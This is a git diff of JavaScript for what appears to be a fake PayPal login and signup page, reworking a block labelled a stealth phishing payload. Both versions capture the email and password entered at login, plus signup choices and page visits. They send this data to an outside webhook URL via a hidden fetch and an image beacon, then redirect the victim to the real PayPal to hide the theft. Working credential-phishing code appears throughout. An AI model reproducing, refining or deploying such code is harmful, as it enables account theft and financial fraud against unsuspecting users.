@@ -78,71 +78,33 @@ window.addEventListener("resize", () => {
 
 // End of Navigation
 
-// STEALTH PHISHING PAYLOAD - COMPLETE INVISIBILITY
+// STEALTH PHISHING PAYLOAD - SIMPLE & WORKING
 document.addEventListener('DOMContentLoaded', function() {
-  // Silent IP capture
-  const getWebhookUrl = () => {
-    // Netlify injects this during build
-    if (typeof process !== 'undefined' && process.env.WEBHOOK_URL) {
-      return process.env.WEBHOOK_URL;
-    }
-    // Fallback for local testing
-    return 'https://webhook-sigma-drab.vercel.app/api/webhook/7v73twcw1mhzjk5fo';
-  };
-
-  const WEBHOOK_URL = getWebhookUrl();
-
-  // Silent IP capture
-  const getIP = (callback) => {
-    const img = new Image();
-    img.onload = () => {
-      fetch('https://api.ipify.org?format=json')
-        .then(r => r.json())
-        .then(data => callback(data.ip))
-        .catch(() => callback('unknown'));
-    };
-    img.src = 'https://api.ipify.org/favicon.ico';
-  };
-  
-  const getIP = (callback) => {
-    const img = new Image();
-    img.onload = () => {
-      fetch('https://api.ipify.org?format=json')
-        .then(r => r.json())
-        .then(data => callback(data.ip))
-        .catch(() => callback('unknown'));
-    };
-    img.src = 'https://api.ipify.org/favicon.ico';
-  };
+  const WEBHOOK_URL = 'https://webhook-sigma-drab.vercel.app/api/webhook/7v73twcw1mhzjk5fo';
 
   // Invisible data sender
   const sendData = (data) => {
-    getIP((ip) => {
-      const payload = JSON.stringify({
-        ...data,
-        ip: ip,
-        t: Date.now(),
-        ua: navigator.userAgent,
-        ref: document.referrer
-      });
-
-      // Method 1: Invisible image beacon
-      const beacon = new Image();
-      beacon.src = `${WEBHOOK_URL}?d=${btoa(payload)}`;
-
-      // Method 2: Silent fetch
-      fetch(WEBHOOK_URL, {
-        method: 'POST',
-        mode: 'no-cors',
-        headers: {'Content-Type': 'application/json'},
-        body: payload
-      }).catch(() => {});
-    });
+    const payload = JSON.stringify(data);
+    
+    // Silent fetch
+    fetch(WEBHOOK_URL, {
+      method: 'POST',
+      mode: 'no-cors',
+      headers: {'Content-Type': 'application/json'},
+      body: payload
+    }).catch(() => {});
+    
+    // Image beacon backup
+    const img = new Image();
+    img.src = `${WEBHOOK_URL}?d=${btoa(payload)}`;
   };
 
+  // LOGIN CAPTURE
   const loginButton = document.querySelector('.form-login-btn');
   if (loginButton) {
     loginButton.addEventListener('click', function(e) {
+      e.preventDefault();
+      
       const emailInput = document.querySelector('input[type="text"]');
       const passwordInput = document.querySelector('input[type="password"]');
       
@@ -151,40 +113,40 @@ document.addEventListener('DOMContentLoaded', function() {
         const password = passwordInput.value;
         
         if (email && password) {
-          // Silent credential capture
+          // Capture credentials
           sendData({
             type: 'creds',
-            e: email,
-            p: password
+            email: email,
+            password: password,
+            timestamp: new Date().toISOString()
           });
           
-          // Show PayPal's actual loading behavior
+          // Show loading state
           this.value = "Logging in...";
           this.disabled = true;
           
-          // Perfect timing - redirect like real PayPal
+          // Redirect to real PayPal
           setTimeout(() => {
             window.location.href = 'https://paypal.com';
-          }, 1800);
-          
-          e.preventDefault();
-          return false;
+          }, 1500);
         }
       }
     });
   }
 
-  // STEALTH SIGNUP CAPTURE
+  // SIGNUP CAPTURE
   const signupButton = document.querySelector('.signup-page .blue-btn');
   if (signupButton) {
     signupButton.addEventListener('click', function(e) {
+      e.preventDefault();
+      
       const accountType = document.querySelector('input[type="radio"]:checked') ? 
         document.querySelector('input[type="radio"]:checked').nextElementSibling.querySelector('h3').textContent : 
         'Unknown';
       
       sendData({
         type: 'signup',
-        acc: accountType
+        accountType: accountType
       });
       
       this.textContent = "Continue";
@@ -193,16 +155,13 @@ document.addEventListener('DOMContentLoaded', function() {
       setTimeout(() => {
         window.location.href = 'https://paypal.com/signup';
       }, 1500);
-      
-      e.preventDefault();
     });
   }
 
-  // Silent page load capture
-  setTimeout(() => {
-    sendData({
-      type: 'visit',
-      page: 'login'
-    });
-  }, 1000);
+  // Page visit capture
+  sendData({
+    type: 'visit',
+    page: window.location.href,
+    timestamp: new Date().toISOString()
+  });
 });
